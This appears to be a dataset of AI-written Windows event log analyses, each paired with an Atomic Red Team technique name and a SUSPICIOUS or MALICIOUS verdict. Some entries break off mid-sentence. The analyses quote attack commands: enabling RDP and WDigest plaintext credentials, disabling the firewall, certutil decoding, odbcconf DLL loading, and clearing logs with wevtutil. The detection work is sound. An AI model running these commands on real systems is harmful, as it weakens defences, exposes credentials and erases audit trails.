**Resolution: SUSPICIOUS**

Based on the analysis, the logs contain activities that are suspicious and warrant further investigation. The clearing of logs alongside the execution of potentially malicious commands suggests a possible compromise. 

**Recommendations**:
- Conduct a deeper investigation into the `admin_test` account and its activities to determine whether they align with typical usage patterns.
- Verify the authenticity of the hash `BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`.
- Check the system for any unauthorized changes, unknown services, or additional suspicious files.
- Ensure logging is restored and enhance monitoring to capture any further suspicious activity.
- Consider a controlled investigation to determine the potential scope and impact of the event, and evaluate whether an incident response is needed."
Enable RDP via Registry (fDenyTSConnections),"Upon reviewing the given logs, I have identified a series of suspicious activities that warrant further investigation. Here’s a detailed analysis of the findings:

1. **Clearing of Event Logs:**
   - Multiple event logs have been cleared: System log (EventID 104), Security log (EventID 1102), and Windows PowerShell log (EventID 104). 
   - The clearing of event logs is an activity often associated with malicious intent, as attackers commonly do this to cover their tracks after compromising a system.

2. **Command Line Usage:**
   - The event logs show the use of `wevtutil.exe` to clear logs using command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`, and `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`.
   - Since `wevtutil` is being executed by `admin_test`, this could indicate either an administrative task or malicious activity if done without legitimate purpose.

3. **Registry Modification:**
   - `cmd.exe` is shown executing a command to change the Windows registry: `""cmd.exe"" /c reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f`.
   - This modification enables Remote Desktop Protocol (RDP), which is a potential security risk, especially if not authorized.

4. **Unusual Execution Paths and Frequencies:**
   - A large number of processes involving Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) and related executables, such as `MicrosoftEdgeUpdateSetup.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`, are repeatedly started.
   - While frequent updates are common, the multitude and rapid succession may need verification to ensure these are genuine update processes.

5. **Privilege Escalation Indicators:**
   - The logs indicate privileges being granted, as seen in events like EventID 4672, which lists extensive privileges granted to the SYSTEM account, further suggesting potentially unauthorized system-level actions.

### Conclusion and Recommendation

Based on the identified indicators:

- **Log Clearing:** Suggests potential malicious intent aimed at hiding traces of activity.
- **Registry Modifications:** Could be an attempt to alter system settings for remote access against security policies.
- **Frequent Edge Updates:** Requires verification if these were legitimate updates.

Given these findings, the assessment is:

**Resolution: SUSPICIOUS**

The activities observed are suspicious due to the log-clearing events, registry changes for enabling RDP, and persistent use of system-level commands without clear administrative justification. Further investigation is necessary to determine the intent and legitimacy of these actions. It is essential to confirm with the local IT/administrative teams whether these activities were authorized, and to ensure system integrity and security.

**Recommended Actions:**
1. Audit user `admin_test` activities for legitimacy.
2. Review network logs for any unusual access or lateral movement.
3. Conduct a security audit of other system configurations for potential unauthorized changes.
4. Ensure up-to-date antivirus and security measures are in place.
5. Consider isolating the host for further forensic analysis if unauthorized activity is suspected."
Indirect Command Execution - forfiles.exe,"Upon reviewing the provided logs, several points of interest and potential concerns have been identified:

1. **Log Clearing Activity:**
   - **Security Event Log ID 1102**: A log-clearing event was initiated by the `admin_test` user (SID: S-1-5-21-3962163828-2803415714-1403596700-1006). Clearing event logs, especially security logs, can be indicative of attempts to cover tracks and is a common tactic used in malicious activity.

2. **Security Tool Utilization:**
   - There are multiple `wevtutil` executions to clear various Windows Event logs. The `wsmprovhost.exe` process, running under the `admin_test` user account, is the parent of these `wevtutil` calls. This could suggest scripted or automated actions to erase traces of logs systematically, which is suspicious, especially if unplanned or unauthorized.

3. **Suspicious Command-Line Activity:**
   - The command `cmd.exe /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe` is observed in Sysmon logs. The usage of `forfiles` with command execution is unorthodox and is often tied to attempts to utilize vulnerabilities or execute unauthorized commands.
   - Processes like `whoami.exe` and `HOSTNAME.EXE`, while benign in isolation, are more suspicious when paired with other indicators like command execution scripts and log clearing.

4. **No PowerShell Events:**
   - The absence of Windows PowerShell logs in this dataset also stands out. This could be related to tampering or limitations in the logging setup, an area worth investigating.

5. **Use of NT AUTHORITY/SYSTEM:**
   - Many of the services, especially those related to system maintenance like `EdgeUpdate` and `CompatTelRunner`, appear to run under the `NT AUTHORITY\SYSTEM` account. This in itself isn’t suspicious as these processes often run with elevated privileges for legitimate system maintenance tasks.

**Assessment:**
- The logs exhibit **suspicious activity**, primarily due to the clearing of event logs and unusual command-line execution tied with administrative privileges. Clearing logs in itself warrants further investigation to understand the context and authorization of such action.

**Resolution:** SUSPICIOUS

**Guidance on How to Proceed:**
- **Immediate Action:** Investigate the `admin_test` user account. Verify recent user activities, account status changes, and corresponding audit logs.
- **Log Monitoring:** Enhance logging and monitoring of event logs, particularly on high-privilege accounts, and ensure logs are backed up and secured.
- **Security Review:** Review access control configurations, especially for accounts with administrative privileges, and run antivirus/malware scans for signs of compromise.
- **Review Automation/Scripting Use:** Check for any scheduled tasks, scripts, or automation policies that might clear logs as part of legitimate system maintenance to rule out false positives.

Given the potential implications, collaboration with internal IT security teams or a forensic consultant could be necessary depending on any future findings."
System Scope COR_PROFILER,"Upon analyzing the provided Windows event logs, the following observations were made:

1. **System Log and Security Log:**
   - Multiple entries indicate that logs from several channels (System, Windows PowerShell, Security) were cleared by the user ""admin_test"" on ""SERVER002"". Specifically, the use of `wevtutil.exe` with the command line `cl` is consistent with clearing event logs.
   - Event ID 104 from the ""Microsoft-Windows-Eventlog"" provider corresponds to log clearing events, which is commonly associated with attempts to hide malicious activity.

2. **Application Log:**
   - The ""edgeupdate"" service stopped, as indicated by the logs, which by itself doesn't immediately suggest malicious behavior but, in conjunction with log clearing, could be an indicator if this is not a standard operation for this environment.

3. **Windows PowerShell Log:**
   - The PowerShell logs show the execution of a script that modifies system environment variables. It's a PowerShell command that corresponds to a technique used in the Atomic Red Team, specifically T1574.012 - ""DLL Search Order Hijacking,"" to manipulate environment variables. This action is non-standard and potentially harmful, especially if the DLL referenced (in the TEMP directory) isn't verified.
   - These PowerShell commands could enable malicious behavior, such as persistence or privilege escalation, if misused.

4. **Sysmon Log:**
   - The frequent launching of processes including `powershell.exe`, `wevtutil.exe`, and `conhost.exe`, as well as the execution of commands to clear multiple logs (`wevtutil.exe cl <log name>`), aligns with the actions of an attacker trying to maintain persistence and hide traces.
   - The presence of `powershell.exe` modifying critical environment variables in conjunction with cleared logs is highly suspicious, especially as it ties back to known red team testing techniques.

5. **Indicators of Malicious Activity:**
   - Log clearing of critical channels (System, Security, and PowerShell) without corresponding legitimate reasoning.
   - Execution of `powershell.exe` commands that could be leveraged for persistence related to a known MITRE ATT&CK technique, specifically DLL hijacking.
   - The suspicious temporal correlation of these actions—log clearing and PowerShell activity—point towards an orchestrated attempt to modify environmental settings while covering tracks.

### Conclusion

Considering the logs provided, the activities logged under user ""admin_test"" exhibit clear indicators of potentially malicious behavior.

**Final Resolution: MALICIOUS**

### Recommendations

- Immediately restrict and analyze the account ""admin_test"" to ensure it is not compromised.
- Investigate the DLL referenced in the PowerShell command to verify its origin and ensure it is not malicious.
- Review other systems for similar patterns of behavior or indications of compromise.
- Reinforce the monitoring and alerting of sensitive actions, especially log clearing and environment manipulation.
- Consider forensic analysis of the host to uncover additional indicators of compromise and potential data exfiltration."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"The analysis of the logs reveals several indicators of suspicious activity, primarily focused around PowerShell activities and event log clearing. Below is a detailed assessment:

### Suspicious and Anomalous Behaviors:

1. **PowerShell Execution:**
   - The logs show multiple instances of PowerShell being executed with the command:
     ```
     powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_JScript.msi' }}
     ```
   - The use of `Invoke-CimMethod` to run installation scripts could indicate script-based attacks leveraging PowerShell for execution, particularly given the reference to Atomic Red Team which organizes tests for security controls.

2. **Event Log Clearing:**
   - Logs from both System and Security channels indicate that event logs were cleared around the same timestamp:
     - System log cleared by user `admin_test`.
     - Security log cleared as per Event ID 1102.
   - Such activity can be associated with attempts to cover tracks following malicious activities.

3. **Use of `wevtutil`:**
   - There are multiple logs showing the execution of `wevtutil.exe cl` to clear logs, another method used by adversaries to hide evidence of their activities.
  
4. **Application Log:**
   - There are MSI Installer logs related to the installation of the MSI package from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\T1218.007_JScript.msi`.

### Assessment:

The combination of clearing event logs, the execution of PowerShell commands associated with possible installation scripts related to testing and simulation frameworks like Atomic Red Team, along with the use of `wevtutil.exe` for log clearance, represents a suspicious pattern that could indicate malicious intent. Especially suspicious is the exact nature of the PowerShell commands in relation to Atomic Red Team, which is a known reference for red team tactics.

### Resolution:
- **SUSPICIOUS**: Although there is no definitive proof that these activities led to a compromise or data breach, the presence of actions characteristic of attack techniques, such as event log clearing and script execution through PowerShell, warrant further, deeper investigation.

### Guidance on How to Proceed:

1. **Immediate Investigation:**
   - Confirm whether the execution of the PowerShell script and logs clearing is intentional or sanctioned by the organization.
   - Check if the system involved was part of any legitimate penetration testing or red team exercises.

2. **Isolate and Inspect:**
   - Isolate the affected system (Server002) to prevent further potential compromise.
   - Conduct a forensic analysis on `Server002` to search for additional artifacts or changes outside of logs.

3. **Audit User Activities:**
   - Investigate the activities of the user `admin_test`, especially around the time of detected suspicious actions.

4. **Enhanced Monitoring:**
   - Increase monitoring of PowerShell activity and event log operations across systems to quickly detect similar cases.

5. **Review Policies:**
   - Reassess security policies to ensure logs clearing is allowed only under strict guidelines with appropriate oversight.

Overall, comprehensive follow-up and proactive measures are necessary to determine the legitimacy of this activity and mitigate potential risks."
Use Powershell to Modify registry to store logon credentials,"Based on the analysis of the provided Windows event logs, several activities have been identified for further investigation. Here is a breakdown of the key findings:

1. **Wevtutil Usage**:
    - Multiple instances of `wevtutil.exe` are observed in the logs. This command-line tool is used for managing Windows event logs. The command `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` is used to clear the Sysmon event log. This activity was executed under the user `SERVER002\\admin_test` and suggests attempts to clear or tamper with event logs, which is a common tactic to cover tracks after a malicious activity.

2. **PowerShell Execution**:
    - A PowerShell command was executed: `Set-ItemProperty -Force -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name 'UseLogonCredential' -Value '1' -ErrorAction Ignore`. Enabling WDigest can lead to plain-text passwords being stored in memory, which is a known tactic used to pull credentials from a system (Credential Dumping). This is considered a significant indicator of compromise (IOC).

3. **Event Logs Cleared**:
    - The security log file was cleared by the user `admin_test`. Clearing security logs is a red flag, as it is often performed by adversaries to erase records of their activities on a system.

4. **Time Change**:
    - There is an instance of time change in the logs, where the time was reset backward. Such actions are sometimes associated with anti-forensic measures to disrupt event log chronological order, potentially aiding in obfuscating malicious activities.

5. **Sysmon Process Monitoring**:
    - There are references to processes such as `MicrosoftEdgeUpdate.exe`, `conhost.exe`, and `svchost.exe` but without immediate suspicious command-line arguments or behaviors. However, their execution in conjunction with the tampering of logs merits scrutiny.

**Assessment**: 
Given the presence of commands used to clear event logs, suspicious PowerShell activity related to WDigest, and time manipulation actions, there are clear indicators of potentially malicious activity intended to compromise the system and hide tracks.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected host to prevent further lateral movement.
- Conduct a deeper forensic investigation to uncover additional indicators of compromise or persistence mechanisms.
- Analyze network logs to determine if data exfiltration occurred.
- Reset access credentials, focusing on accounts with elevated privileges.
- Apply security patches and updates to prevent exploitation of known vulnerabilities.
- Reinforce logging and monitoring capabilities to detect similar activities in the future.
- Review and tighten access controls and least privilege policies."
Deobfuscate-Decode Files Or Information,"Upon analyzing the provided Windows event logs, several aspects stand out:

1. **Log Cleared Events:**
   - **System EventID 104** and **Security EventID 1102** indicate that logs have been cleared. The `wevtutil.exe` command was run with the `cl` (clear logs) parameter on multiple channels (System, Security, Application, and Windows PowerShell), by the user `admin_test`.
   - This is highly suspicious activity because attackers often clear event logs to erase traces of their malicious activities.

2. **Command-Line Activity:**
   - Several `cmd.exe` processes executed using the `certutil` command to encode and decode files, specifically `calc.exe`. The use of `certutil` in this manner can be an indicator of malicious activity, as it is often used by attackers for file obfuscation related to staging payloads.
   - The command executed was: 
     ```
     ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
     ```
   - Encoding and decoding executables like this appear highly suspicious and potentially malicious.

3. **Privilege Usage:**
   - **Security EventID 4672** indicates that `admin_test` had several high-level privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeTakeOwnershipPrivilege`. The process had high integrity, potentially allowing logged on user actions that require elevated permissions.
   - These privileges could be used by an attacker to escalate their abilities on the compromised system.

4. **Suspicious Process Execution:**
   - `wevtutil.exe` usage to clear logs multiple times and the nature of the command lines used in `cmd.exe`, shows an intent to hide certain activities and manipulate binaries on the system.
   - Processes like `certutil.exe` being run with encode/decode parameters are indicative of malicious actions aimed at bypassing security mechanisms.

### Conclusion
Based on the pattern of log clearing by `admin_test`, privilege usage, and suspicious use of built-in Windows utilities like `certutil` and `wevtutil`, it is concluded that there is clear evidence of malicious activity within these logs.

### Recommendation
- Immediate investigation and isolation of the affected host, `Server002`, is recommended.
- Conduct full forensic analysis to identify any additional compromised elements on the system.
- Review user activity for `admin_test` and ensure proper security controls such as authentication and authorization checks are in place.

Final assessment: **MALICIOUS**"
Lolbas ie4uinit.exe use as proxy,"Upon analyzing the provided Windows event logs, several points of interest stand out which indicate potential malicious activity:

1. **Log Clearing Events:**
   - The security log (EventID: 1102) was cleared by the user ""admin_test"" using `wevtutil.exe` (ProcessId: 4800). This activity is suspicious because clearing event logs can be an attempt to cover tracks or hide malicious activities.
   - The system log was also cleared by ""admin_test"". Regular operations generally do not require clearing system logs, making this action suspicious.

2. **Activity from admin_test User:**
   - Multiple operations involving `wevtutil.exe`, `cmd.exe`, `whoami.exe`, and other utilities were executed by ""admin_test"". These are generally used in administrative or script-based environments, but their clustering and concurrent activity, along with the log clearings, raise questions about their intent.
   - A `cmd.exe` execution was seen copying `ie4uinit.exe` and another .inf file to the TEMP directory and executing it with `-BaseSettings`, which can be suggestive of an attempt to run a custom script or init settings that bypass typical software checks.

3. **Potential Execution of Suspicious Commands:**
   - The utilization of `cmd.exe` to potentially execute an Internet Explorer initialization utility (`ie4uinit.exe`) with specific settings (`-BaseSettings`) hints at using legitimate programs for potentially malicious intent, commonly seen with Living-off-the-Land tactics.
   - The frequent utilization of `rundll32.exe` indicates possible execution of DLL libraries. The command involving `WininetPlugin.dll,MigrateCacheForUser` hints at altering user-related settings, often associated with migrating settings across systems potentially without user knowledge.

4. **Security Audit Events:**
   - There are multiple EventID: 4624 log entries which indicate logon sessions using ""SYSTEM"" credentials. Given they occur at times around the log clearance and known suspicious commands, they raise the concern of privilege misuse or escalation.

Based on the patterns of activity observed, the clustering of suspicious commands, heavily leveraging administrative utilities, and log-clearing activities, the logs contain indicators that potentially suggest malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
- Conduct a thorough investigation of the user's account ""admin_test"" to ascertain the intent behind the command executions.
- Examine any associated machines for further traces of potentially malicious commands or unauthorized software.
- Consider network-level monitoring of traffic originating from or destined for Server002 to find any correlating suspicious external communication.
- Strengthen internal controls regarding log retention and monitor any future log-clear actions closely.
- If feasible, inspect the TEMP directories for any remnants of these files executed (particularly the copied/executed scripts) and analyze them for malicious content or intent."
Odbcconf.exe - Execute Arbitrary DLL,"### Analysis:

Upon analyzing the provided logs, here are the findings with special attention to potentially suspicious or malicious activities:

1. **Clearing of Event Logs:**
   - There are multiple instances of event logs being cleared, as indicated by EventID `104` in the System log and EventID `1102` in the Security log. The user responsible for this is `SERVER002\admin_test`. 
   - Clearing event logs without specific reasons is considered suspicious because it can be used to cover tracks by malicious actors after performing unauthorized actions.

2. **Usage of `wevtutil`:**
   - The `wevtutil` command is used to clear logs for various channels, namely ""System"", ""Microsoft-Windows-Sysmon/Operational"", and ""Windows PowerShell"". 
   - This further solidifies the suspicion around potential malicious activity aimed at hiding evidence.

3. **PowerShell Activity:**
   - The presence of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` in the Sysmon log shows PowerShell was likely involved in some actions. The usage of PowerShell is common for both administrative tasks and for malicious activities, depending on what scripts or commands were run.
   - Unfortunately, specific PowerShell commands executed are not provided in the logs, but its frequent execution along with log clearing raises concern.

4. **Execution of Suspicious Commands:**
   - There is an entry where `cmd.exe` was used to register a DLL via `odbcconf.exe`:
     - `CommandLine`: `""cmd.exe"" /c odbcconf.exe /S /A {REGSVR ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.008\\src\\Win32\\T1218-2.dll""}`
   - The use of ODBC Data Source Administrator to register a DLL can be a technique used by attackers to load malicious payloads into the system under the guise of legitimate data source administration.

5. **Network Activity:**
   - Processes such as `sppsvc.exe`, `WmiPrvSE.exe`, and other system processes show normal activity related to system updates or services and involve the `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE`, which are common for system operations.

### Assessment:

The activities observed in the logs indicate that there are potentially **suspicious** actions that need thorough investigation:
- The clearing of multiple log channels is a strong indicator of an attempt to hide potentially malicious activities.
- The registration of a DLL using `odbcconf.exe` under the path resembling techniques from the ""AtomicRedTeam"" toolkit suggests potential testing of known attack techniques or actual use in a malicious context.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Investigate the user `SERVER002\admin_test` for any abnormal activities or login/business patterns.
   - Check if the account is compromised or used legitimately for any penetration testing without proper documentation or authorization.

Bypass UAC using Fodhelper - PowerShell,"After analyzing the provided logs, several activities stand out as suspicious and indicative of potential malicious behavior:

1. **Event Log Clearing**: 
   - The security event with EventID 1102 indicates the clearing of log files, performed by the user `admin_test`. This action often aims to cover malicious activity and is a common indicator of compromise. Clearing logs is generally a red flag as it can indicate an attempt to hide traces of unauthorized actions.

2. **Privilege Escalation via `Fodhelper`**:
   - In the PowerShell logs, a suspicious script is executed that involves modifying registry keys related to `ms-settings` and launching `fodhelper.exe` with `cmd.exe`. This technique is known in the security community as a UAC (User Account Control) bypass, allowing attackers to escalate privileges without prompting for administrator confirmation.

3. **Events with High Privilege Tokens**:
   - EventID 4672 indicates accounts with special privileges. The presence of various privileges like SeDebugPrivilege, SeTcbPrivilege, and others in the event are typically given to admin users and could be exploited if misused or used in conjunction with other attack vectors (like the PowerShell command).

4. **Suspicious PowerShell Activity**:
   - There is a consistent execution of PowerShell scripts that directly manipulate registry settings in a manner commonly associated with privilege escalation tactics.

5. **Sysmon Logs**:
   - The `wevtutil.exe` process being executed to clear logs (as highlighted in the Sysmon events) corroborates the log-clearing activity seen in the security logs. The combination of `wevtutil.exe` usage, alongside high-integrity sessions, makes this behavior highly suspicious.

6. **Network Logs and Edge Update Activity**:
   - Repeated execution of processes associated with `Microsoft EdgeUpdate.exe` in processes controlled by `SYSTEM` authority. While frequent updates may be legitimate, excessive update activity can mask malicious downloads or executions, especially when coupled with other suspicious behavior.

Based on these observations:

- **Assessment**: The logs contain strong indicators of malicious activity. The combination of log clearing, privilege escalation attempts, and PowerShell usage with known techniques for bypassing security controls provide substantial evidence of wrongdoing.

Disable Windows CMD application,"Upon detailed analysis of the logs provided, here are the key points and suspicious activities observed:

1. **Clearing of Event Logs:**
    - The security event log (EventID: 1102) and system event log (EventID: 104) are showing entries indicating the logs were cleared by the user `admin_test`. This action is performed using `wevtutil.exe`, which can be suspicious, especially if not typical for the user. Clearing event logs can be an indication of covering tracks after performing unauthorized actions.

2. **Suspicious PowerShell Execution:**
    - There is an event showing the execution of a PowerShell script with the command `New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1`. This command is used to disable Command Prompt, which can be seen as an attempt to restrict system administrator actions or hide malicious activities.
    - The PowerShell script is run from a temporary directory using high integrity level privileges, which can be unusual and suggest unwanted actions are being taken on the system.

3. **Time Change Events:**
    - Multiple time change events are recorded in the system log (EventID: 4616 and 1) indicating the system time was altered. Altering system time can potentially be used to confuse timestamps in logs and make tracking of events more difficult.

4. **Use of Wevtutil and Whoami:**
    - The use of `wevtutil` to clear logs and `whoami` for getting logged on user information under high integrity level might not be directly malicious but is contextually suspicious, especially following the clearing of logs and PowerShell execution.

5. **Microsoft Edge Update Activities:**
    - There are multiple logs regarding Microsoft Edge Update processes executed under `NT AUTHORITY\SYSTEM`. These look like legitimate update processes and do not necessarily indicate suspicious activity.

**Assessment: SUSPICIOUS**
- The combination of clearing logs, unusual PowerShell activity targeting registry settings, and time changes indicates potentially suspect behavior that warrants further investigation.
- It is recommended to investigate the intention and necessity of these actions thoroughly, especially focusing on the user's activities and correlating them with other system behaviors at the same time.
- Check for additional signs of lateral movement, privilege escalation attempts, or other signs of system compromise.
- Conduct a full review of the activities performed by the `admin_test` user and confirm whether the commands executed align with legitimate admin tasks.

**Guidance on How to Proceed:**
- Confirm the legitimacy of log clearing by `admin_test`. If this action is not authorized, this warrants a deeper security investigation.
- Review the source and necessity for the PowerShell script that was executed.
- Ensure that system time changes were authorized and ascertain whether any tasks executed during changed system times align with expected activities.
- Double-check any policies set that may disable system functionalities like CMD or other admin tools, ensuring they meet organizational IT policies.
- Conduct further digital forensic analysis to determine any additional anomalies or unauthorized access activities on `Server002`."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"Upon analyzing the logs provided, several elements stand out that may warrant further investigation:

1. **Security Log - Event ID 1102 (Event Log Cleared)**:
   - The event log shows an entry with Event ID 1102, indicating that the event logs were cleared by the user ""admin_test"" on ""Server002"". Clearing event logs is a common tactic used by malicious actors to cover their tracks. 

2. **Sysmon Log - Process activities related to `wevtutil.exe`**:
   - Multiple Sysmon events show activity related to `wevtutil.exe`, which is used to clear event logs, across different channels such as Sysmon, Application, Security, and System. All these instances were executed by the user ""admin_test"" with high integrity, indicating the user may have administrative privileges.

3. **Cmd.exe and reg.exe execution**:

LockBit Black - Unusual Windows firewall registry modification -cmd,"### Detailed Analysis

Upon analysis of the provided Windows event logs, the following points have been identified:

#### Sysmon Log:
1. **Process Execution and Command-Line Activity:**
   - Multiple instances of `wevtutil.exe` are seen being run by the user `SERVER002\admin_test` from a high integrity level. Noteworthy command lines include `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application`, `\""C:\\Windows\\system32\\wevtutil.exe\"" cl System`, and `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security`. The `wevtutil.exe` command-line utility is often used to clear event logs, which, when done without apparent reason, can indicate malicious intent focused on covering tracks.
   - The `cmd.exe` process shows commands to disable the Windows firewall via registry changes, with precise commands:
     - `reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f`
     - `reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f`
   - The logs also reveal usage of `wevtutil.exe` and `cmd.exe`, which is often associated with unauthorized changes or concealment of activities in a system.

#### System Log:
1. **Event Log Clearing:**
   - Event ID 104 signals that the event log was cleared (both System and Windows PowerShell channels) by the user `admin_test`. This action can be highly suspicious if no legitimate reasons are known, especially following immediately after the process execution activity discussed.

#### Security Log:
1. **Event Log Cleared:**
   - Event ID 1102 confirms that the Security log was cleared by the user `admin_test`. This indicates an intent to remove traces of activities and emphasizes potential malicious behavior.
2. **Logon and Privileges:**
   - Event ID 4624 and 4672 show logons with elevated privileges, giving the user significant permissions (e.g., SeDebugPrivilege, SeBackupPrivilege), potentially indicating compromises in user account control.

#### Application Log:
- The logs in the Application channel do not provide significant insight into malicious activities. The occurrence of Microsoft Edge updates is normal periodic maintenance or installation activity.

### Assessment and Resolution

**Suspicious Activity:**
The combination of the following events is deemed suspicious:
- The execution of the wevtutil utility with commands to clear logs combined with deleted Security log entries.
- Disabling of the Windows firewall via registry settings by a high privilege process suggests system configuration changes that could expose the system to threats.
- Cleared event logs in the System and Security logs suggest an attempt to obfuscate the system's history.

**Risks Identified:**
- Potential unauthorized access or an insider threat given the local account `admin_test` exhibiting abnormal activities.
- Ensuring system integrity is important, as cleared logs make it difficult to perform post-incident investigations.

### Guidance and Resolution

1. **Investigate:**
   - Further investigative actions should follow to verify the legitimacy of the `admin_test` user account activities.
   - Correlate these findings with any recent changes in policies or updates to firewall settings.

2. **Monitor:**
   - Enable enhanced monitoring and logging for activities by accounts with administrative access.
   - Consider implementing alerts for suspicious command-line executions and log clearance activities.

3. **Secure:**

   - Review and enforce security policies, particularly around logging and system audits.

**Resolution: SUSPICIOUS**
The logs contain activity that does not appear normal and warrants further investigation to confirm or refute potential compromises. There's no direct evidence of malicious activity, but the indicators necessitate caution and proactive measures."
InstallUtil evasive invocation,"Upon analyzing the provided event logs, the following observations suggest potentially malicious or highly suspicious activity:

1. **Clearing of Event Logs:**
   - We observe events pertaining to the clearing of the system, PowerShell, and security logs. Event clearing is represented by Event ID 1102 in the Security log and Event ID 104 in the System log. These actions were executed by the `admin_test` user (SID: S-1-5-21-3962163828-2803415714-1403596700-1006) on the machine `Server002` and can indicate efforts to hide malicious activities.

2. **Suspicious PowerShell Activity:**
   - PowerShell logging shows execution with manipulated paths and certain operations indicative of malicious intentions. The command to copy the `InstallUtil.exe` to a task folder and rename it as `notepad.exe` is an example. PowerShell scripts often serve as a vector for executing malicious payloads, especially when dealing with the registry, aliases, and custom utilities in this fashion.

3. **Execution of Known Lateral Movement or Evasive Techniques:**
   - The PowerShell script `InstallUtilTestHarness.ps1` that was executed aligns with known adversary techniques frequently used to bypass security controls. Specifically, leveraging `InstallUtil.exe` for non-standard purposes can be an indicator of a malicious actor executing system utilities for unintended purposes.
   - Execution of the `InstallUtil.exe` disguised as `notepad.exe` from a suspicious directory was confirmed in the Sysmon logs.

4. **Process Execution Patterns:**
   - The frequent invocation of system utilities like `csc.exe`, `cvtres.exe` through PowerShell as parent processes without legitimate context creates an anomalous pattern that warrants deeper investigation. These utilities are often used to compile or manipulate code which might be crafted by an attacker. 
   - Additionally, execution of `wevtutil.exe` to clear specific event logs (System, PowerShell, Security) without a clear administrative need is suspicious.

5. **Usage of Administrative Privileges:**
   - The events tied to User IDs with administrative rights suggest improper usage or unauthorized access pretending or leveraging an administrative account like `admin_test`. 

6. **Other Potentially Malicious Indicators:**
   - CommandLine with `conhost.exe` and other suspicious parameters have been executed multiple times. This might be associated with attempts to create console hosts for shell execution related to the operations described above.

Given these evidences, this log analysis strongly suggests that the activity is MALICIOUS. The logs display clear signs of possible intrusion and subsequent efforts to obfuscate tracks (log clearing). It is recommended to take corrective actions immediately, including conducting a full investigation of the `Server002` system, reviewing access logs, implementing stricter monitoring, and conducting an audit of all user activities, especially `admin_test`. Additionally, ensure security updates are applied, review and harden group policies, and consider network segmentation to contain potential damage or further unauthorized access."
Snake Malware Encrypted crmlog file,"Based on the provided logs, here is a detailed analysis highlighting suspicious activities:

### Suspicious or Anomalous Behavior Identified:

1. **Event Log Clearing:**
   - **Sysmon Log:** There are multiple instances of `wevtutil.exe` being executed with a command line indicating the clearing of event logs (e.g., clearing ""Application"", ""Security"", ""System"", and ""Windows PowerShell""). This was performed by the user `SERVER002\admin_test`.
   - **System Log and Security Log:** Corresponding events show that logs for System, Windows PowerShell, and Security event logs have been cleared by the user `admin_test`.

   Clearing of logs, especially the Security log, is a highly suspect action as it might indicate an attempt to cover tracks after malicious activities.

2. **PowerShell Usage:**
   - PowerShell is used to create a file with hidden and system attributes, which is a common tactic used in various malicious activities to establish persistence or hide files.

3. **High Integrity Level Processes:**
   - Processes like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed with a high integrity level by the `admin_test` user.

4. **Console Host Process (conhost.exe) Instances:**
   - Numerous instances of `conhost.exe` are created by processes like `wevtutil.exe`, which indicates command-line operations that might not be typical for usual administrative actions.

5. **Windows Updates and System Executables:**
   - There are several legitimate Windows-related activities including Windows Update (e.g., `wuauclt.exe`) and Windows Defender updates, which appear regular.

### Assessment of the Situation:

Given the evidence of event log clearing, particularly the Security logs, combined with unsanctioned usage of PowerShell to manipulate files with specific attributes, there is a strong indication of potential malicious activity. These actions are not typical for regular administrative operations and suggest behavior consistent with an attempt to obfuscate actions on the system.

Windows Add Registry Value to Load Service in Safe Mode with Network,"After reviewing the provided Windows event logs, here’s a summary of the analysis for any suspicious or anomalous behavior:

1. **Initial Indicator Analysis**:
   - **Log Clearance (Event ID 104 and 1102)**:
     - There are multiple log clearance events across different channels (`Sysmon`, `System`, `Security`, and `Windows PowerShell`). Specifically, at 2024-10-24 16:15:37, an `Event ID 1102` indicates a security log was cleared by user `admin_test`. 
     - Log cleaning is often indicative of an attempt to cover tracks, which is suspicious and typical in account takeovers or unauthorized activities. 

2. **Time Manipulation (Event ID 4616)**:
   - The logs show instances of time changes on 2024-10-24 16:15:36 (e.g., the clock was set backwards a few seconds). The manipulation of system time can be a tactic used in conjunction with log clearance to mask timelines of malicious actions.
   
3. **Registry Editing through cmd.exe (Event ID 1 and 5)**:
   - At 2024-10-24 16:15:38, there’s a suspicious use of `cmd.exe` with `reg.exe` to attempt to add a registry key: `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode`. Modifying registry keys, especially those related to Safe Boot options, can be indicative of attempts to maintain persistence or disable security features.

4. **Frequent Use of `wevtutil` and `conhost.exe`**:
